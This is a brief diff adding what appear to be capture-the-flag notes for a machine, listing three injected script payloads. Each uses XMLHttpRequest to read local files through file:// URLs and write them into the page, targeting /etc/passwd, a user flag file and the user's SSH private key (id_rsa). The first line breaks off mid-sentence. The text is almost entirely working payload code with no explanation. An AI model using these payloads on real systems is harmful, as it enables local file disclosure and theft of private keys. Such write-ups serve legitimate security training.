@@ -1,0 +1,12 @@
+All are injected into 
+
+Part 1. Get /etc/passwd to see the user on this box
+
+<script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); </script>
+
+Part 2. Get the user flag.
+<script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///home/reader/user.txt"); x.send(); </script>
+
+Part 3. Get the id_rsa from the .ssh directory.
+
+<script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///home/reader/.ssh/id_rsa"); x.send(); </script>
